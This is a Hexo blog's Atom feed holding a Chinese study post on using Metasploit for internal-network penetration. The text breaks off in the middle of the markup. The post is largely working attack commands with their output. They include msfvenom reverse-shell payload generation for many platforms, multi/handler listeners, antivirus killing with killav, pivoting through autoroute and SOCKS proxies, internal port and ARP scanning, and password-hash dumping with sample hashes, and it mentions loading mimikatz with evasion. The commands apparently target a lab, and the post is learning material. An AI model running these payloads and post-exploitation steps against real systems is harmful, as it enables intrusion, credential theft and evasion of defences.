<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://s1eady.top/atom.xml" rel="self"/>
  
  <link href="http://s1eady.top/"/>
  <updated>2020-10-06T10:00:55.861Z</updated>
  <id>http://s1eady.top/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网学习--Metasploit使用</title>
    <link href="http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-10-06T10:00:55.861Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Metasploit使用"><a href="#Metasploit使用" class="headerlink" title="Metasploit使用"></a>Metasploit使用</h3><h5 id="基础常用命令"><a href="#基础常用命令" class="headerlink" title="基础常用命令"></a>基础常用命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background  #将当前会话放置后台</span><br><span class="line">getuid # 查看权限</span><br><span class="line">shell #进入目标机cmd shell</span><br><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br></pre></td></tr></table></figure><p>将回话保存到后台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">切换到会话1</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br></pre></td></tr></table></figure><p>查看会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  2         meterpreter x86&#x2F;windows  NT AUTHORITY\SYSTEM @ STU1  172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6)</span><br></pre></td></tr></table></figure><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>获取目标主机上的软件安装信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure><p>关闭杀毒软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure><p>判断是否是虚拟机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br><span class="line"></span><br><span class="line">[*] Checking if STU1 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br></pre></td></tr></table></figure><p>查看补丁信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息</span><br><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200906182724_default_172.20.10.6_enum_patches_447671.txt</span><br><span class="line">[*] KB2534111 applied</span><br><span class="line">[*] KB2999226 applied</span><br><span class="line">[*] KB976902 applied</span><br></pre></td></tr></table></figure><p>查找域控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控</span><br><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: god</span><br><span class="line">[+] FOUND Domain Controller: owa (IP: 192.168.52.138)</span><br></pre></td></tr></table></figure><h5 id="代理与端口设置"><a href="#代理与端口设置" class="headerlink" title="代理与端口设置"></a>代理与端口设置</h5><h6 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br></pre></td></tr></table></figure><h6 id="设置sockets5代理"><a href="#设置sockets5代理" class="headerlink" title="设置sockets5代理"></a>设置sockets5代理</h6><p>搜索一下可用代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search socks</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                     Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary&#x2F;scanner&#x2F;http&#x2F;sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal</span><br><span class="line">   1  auxiliary&#x2F;server&#x2F;socks4a                                  normal  No     Socks4a Proxy Server</span><br><span class="line">   2  auxiliary&#x2F;server&#x2F;socks5                                   normal  No     Socks5 Proxy Server</span><br><span class="line">   3  auxiliary&#x2F;server&#x2F;socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection</span><br></pre></td></tr></table></figure><p>设置代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary&#x2F;server&#x2F;socks5</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary&#x2F;server&#x2F;socks5):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; set SRVHOST 127.0.0.1</span><br><span class="line">SRVHOST &#x3D;&gt; 127.0.0.1</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; set SRVPORT 5555</span><br><span class="line">SRVPORT &#x3D;&gt; 5555</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf5 auxiliary(server&#x2F;socks5) &gt;</span><br><span class="line">[*] Starting the socks5 proxy server</span><br></pre></td></tr></table></figure><p>然后也可以直接使用一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set proxies socks5:127.0.0.1:8990  设置代理</span><br><span class="line">setg ReverseAllowProxy true 允许反向代理</span><br></pre></td></tr></table></figure><p>获取内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">Local subnet: 169.254.0.0&#x2F;255.255.0.0</span><br><span class="line">Local subnet: 172.20.10.0&#x2F;255.255.255.240</span><br><span class="line">Local subnet: 192.168.52.0&#x2F;255.255.255.0</span><br></pre></td></tr></table></figure><p>添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p>查看是否添加成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   198.168.52.0       255.255.255.0      Session 1</span><br></pre></td></tr></table></figure><p>ARP扫描内网主机</p><h5 id="获取目标shell"><a href="#获取目标shell" class="headerlink" title="获取目标shell"></a>获取目标shell</h5><h6 id="常见shell生成"><a href="#常见shell生成" class="headerlink" title="常见shell生成"></a>常见shell生成</h6><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash:</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl:</span><br><span class="line">msfvenom -p cmd/unix/reverse</span><br><span class="line">_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h6 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h6><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.109 LPORT&#x3D;1234 R &gt; shell.php</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br></pre></td></tr></table></figure></li><li><p>msfconsole 监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to 192.168.0.108:1234:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:1234</span><br></pre></td></tr></table></figure></li></ul><h6 id="EXE-木马"><a href="#EXE-木马" class="headerlink" title="EXE-木马"></a>EXE-木马</h6><ul><li><p>生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP  LPORT&#x3D;监听端口 -f exe &gt; hacker.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 攻击IP</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 监听端口</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure></li></ul><h5 id="升级正常的Shell到Meterpreter"><a href="#升级正常的Shell到Meterpreter" class="headerlink" title="升级正常的Shell到Meterpreter"></a>升级正常的Shell到Meterpreter</h5><p>通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell,  因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions  Command 可以帮助我们实现从Shell 到Meterpreter提升。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    4433             yes       Port for payload to connect to.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br></pre></td></tr></table></figure><p>使用一下命名进行切换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u sessionid</span><br></pre></td></tr></table></figure><h5 id="添加去往”内网网段”的路由"><a href="#添加去往”内网网段”的路由" class="headerlink" title="添加去往”内网网段”的路由"></a>添加去往”内网网段”的路由</h5><ul><li><p>MSF 路由添加帮助查询命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1&#x2F;255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1&#x2F;24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1&#x2F;255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post&#x2F;multi&#x2F;manage&#x2F;autoroute module</span><br></pre></td></tr></table></figure></li><li><p>获取目标内网地址段 </p><p>具体获取被攻击目标内网地址网段的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">Local subnet: 172.17.0.0&#x2F;255.255.0.0</span><br></pre></td></tr></table></figure><p>由上可以获知，目标内网网段是“172.17.0.0./24”</p></li><li><p>添加去往目标网段的转发路由 </p><p>在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 172.17.0.0&#x2F;24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">[*] Adding a route to 172.17.0.0&#x2F;255.255.255.0...</span><br><span class="line">[+] Added route to 172.17.0.0&#x2F;255.255.255.0 via 10.48.8.234</span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure></li><li><p>添加网路由后，我们来查看下路由的添加情况如何</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   172.17.0.0         255.255.255.0      Session 3</span><br></pre></td></tr></table></figure></li></ul><p>将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p><ul><li><p>删除路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 172.20.10.0</span><br></pre></td></tr></table></figure></li></ul><h5 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h5><p>进去内网之后，我们使用相关模块进行主机发现。</p><h6 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10</span><br><span class="line">threads &#x3D;&gt; 10</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100</span><br><span class="line">RHOSTS &#x3D;&gt; 172.18.0.2-100</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022</span><br><span class="line">PORTS &#x3D;&gt; 3306,8022</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 172.18.0.3:           - 172.18.0.3:3306 - TCP OPEN</span><br><span class="line">[+] 172.18.0.2:           - 172.18.0.2:8022 - TCP OPEN</span><br><span class="line">[*] 172.18.0.2-100:       - Scanned 10 of 99 hosts (10% complete)</span><br></pre></td></tr></table></figure><h6 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure><h5 id="解决中文乱码问题"><a href="#解决中文乱码问题" class="headerlink" title="解决中文乱码问题"></a>解决中文乱码问题</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>或者将终端临时设置为GBK系列编码即可</p><h5 id="Hash与明文密码获取"><a href="#Hash与明文密码获取" class="headerlink" title="Hash与明文密码获取"></a>Hash与明文密码获取</h5><p>获取目标机系统用户Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200903163754_default_172.20.10.6_windows.hashes_560643.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users with password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::</span><br><span class="line">[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::</span><br><span class="line">[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::</span><br></pre></td></tr></table></figure><p>获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理)</p><figure class="highlight plain"><table><tr><td 